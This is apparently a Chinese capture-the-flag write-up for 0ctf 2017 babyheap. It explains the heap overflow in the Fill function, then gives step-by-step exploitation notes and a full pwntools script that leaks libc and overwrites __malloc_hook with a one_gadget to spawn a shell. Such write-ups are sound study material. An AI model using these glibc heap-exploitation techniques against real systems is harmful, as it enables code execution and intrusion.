# 漏洞成因
## 程序关键结构体
程序使用mmap分配一块内存作为堆块管理结构，每个堆块的管理结构为24字节，定义如下：
```c
struct chunk_info {
    int in_use;          // 0/1表示是否被使用
    size_t size;         // 记录用户请求的大小
    void *ptr;           // 指向分配的堆块指针
};
```
管理结构数组的基址由`sub_B70`随机化生成，传递给各个函数作为第一个参数（a1）。堆块本身通过`calloc`分配。

## 漏洞定位
Fill函数（`sub_E7F`）存在堆溢出漏洞。该函数允许用户指定任意大小的填充数据，未检查填充长度是否超过堆块实际大小，导致溢出相邻堆块。
```c
// sub_E7F 部分代码
printf("Size: ");
result = sub_138C();
v3 = result;
if ( (int)result > 0 )
{
    printf("Content: ");
    return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); // 调用sub_11B2写入数据，长度可控
}
```
其中`sub_11B2`实际为`read_input`函数，向堆块指针写入指定长度的数据，无长度校验。

# 漏洞利用过程：
利用堆溢出修改堆块大小，构造重叠堆块，泄露libc地址，然后通过fastbin attack劫持`__malloc_hook`为one_gadget，最终触发malloc获取shell。

- Step1~5: 通过溢出修改chunk1大小，并构造chunk1与chunk2重叠，修改chunk2大小使其free后进入unsorted bin。
- Step6~7: 释放chunk2，利用重叠的chunk1泄露unsorted bin的fd（即main_arena+88），计算libc基址。
- Step8~10: 释放chunk4进入fastbin，通过溢出chunk3修改chunk4的fd指向伪造的chunk（`__malloc_hook`附近），分配两次得到可控的chunk。
- Step11~12: 在伪造的chunk中覆盖`__malloc_hook`为one_gadget，再次分配触发shell。

## Step1~2
- 分配5个堆块：chunk0(0x10)、chunk1(0x10)、chunk2(0x30)、chunk3(0x40)、chunk4(0x60)。实际chunk大小分别为0x20、0x20、0x40、0x50、0x70。
- 填充chunk0：写入32字节（`p64(0x51)*4`），溢出覆盖chunk1的size为0x51（实际chunk大小0x50）。此时chunk1范围扩大，与chunk2重叠。
- 填充chunk2：写入48字节（`p64(0x31)*6`），刚好填满chunk2的用户数据区，未溢出。

## Step3~5
- 释放chunk1：由于size被改为0x51，free将其放入0x50的fastbin。
- 分配0x40大小的chunk：从fastbin中取出chunk1，重新分配为chunk1（index 1），用户大小0x40。
- 填充chunk1：写入32字节（`p64(0x91)*4`）。由于chunk1与chunk2重叠，chunk2的chunk头位于chunk1用户数据区的偏移0x10处，因此覆盖chunk2的prev_size和size为0x91（实际chunk大小0x90）。

## Step6~7
- 释放chunk2：size为0x90，大于fastbin阈值，进入unsorted bin，其fd和bk指向main_arena+88。
- 调用dump(1)：打印chunk1的内容。由于chunk1与chunk2重叠，chunk1中偏移0x10处开始为chunk2的fd和bk。接收0x20字节后，读取8字节得到main_arena+88的地址，计算libc基址和`__malloc_hook`地址。

## Step8~10
- 释放chunk4：进入0x70的fastbin。
- 填充chunk3：构造payload `p64(0)*9 + p64(0x71) + p64(malloc_hook-0x23)`，溢出修改chunk4的fd为`malloc_hook-0x23`（伪造chunk地址）。
- 连续分配两个0x60的chunk：第一次分配取出chunk4，第二次分配从伪造的chunk地址分配，获得一个指向`__malloc_hook`附近的chunk（index 4）。

## Step11~12
- 填充chunk4：写入`b'a'*0x13 + p64(libc_base + 0x4527a)`，其中0x13为填充到`__malloc_hook`的偏移，覆盖`__malloc_hook`为one_gadget地址。
- 分配一个chunk（任意大小）：触发malloc，调用`__malloc_hook`执行one_gadget，获取shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_07_0ctf_2017_babyheap')
elf = ELF('./data/bin/heap23_07_0ctf_2017_babyheap')
libc = elf.libc

def alloc(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.sendline(str(size).encode())

def fill(idx,payload):
    p.recvuntil(b'Command: ')
    p.sendline(b'2') 
    p.sendline(str(idx).encode())
    p.sendline(str(len(payload)).encode())
    p.send(payload)

def free(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def dump(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: \n')

# Step1: 分配5个堆块，构造初始布局
alloc(0x10);alloc(0x10);alloc(0x30);alloc(0x40);alloc(0x60)

# Step2: 溢出chunk0修改chunk1的size为0x51，使chunk1与chunk2重叠
fill(0,p64(0x51)*4)
fill(2,p64(0x31)*6)  # 仅填充chunk2，无溢出

# Step3: 释放chunk1进入fastbin
free(1)

# Step4: 重新分配chunk1，大小0x40，从fastbin取出
alloc(0x40)

# Step5: 通过chunk1修改chunk2的size为0x91（利用重叠）
fill(1,p64(0x91)*4)  # 覆盖chunk2的prev_size和size

# Step6: 释放chunk2进入unsorted bin
free(2)

# Step7: 通过dump chunk1泄露libc地址
dump(1)
p.recv(0x20)  # 接收chunk1的前0x20字节
SBaddr = u64(p.recv(8))  # 读取chunk2的fd（main_arena+88）
p.recvline()
malloc_hook = SBaddr - 88 - 0x10  # 计算__malloc_hook地址
libc_base = malloc_hook - libc.symbols['__malloc_hook']  # 计算libc基址

# Step8: 释放chunk4进入fastbin（0x70）
free(4)

# Step9: 溢出chunk3修改chunk4的fd指向伪造的chunk（__malloc_hook-0x23）
payload = p64(0)*9 + p64(0x71) + p64(malloc_hook-0x23)
fill(3, payload)

# Step10: 分配两次，第二次得到伪造的chunk（指向__malloc_hook附近）
alloc(0x60)
alloc(0x60)  # 此时index 4指向伪造的chunk

# Step11: 覆盖__malloc_hook为one_gadget
one_gadget = libc_base + 0x4527a
payload = b'a'*0x13 + p64(one_gadget)  # 0x13偏移使写入位置恰好为__malloc_hook
fill(4, payload)

# Step12: 触发malloc，执行one_gadget获取shell
alloc(1)
p.sendline(b'bash')
p.interactive()
```
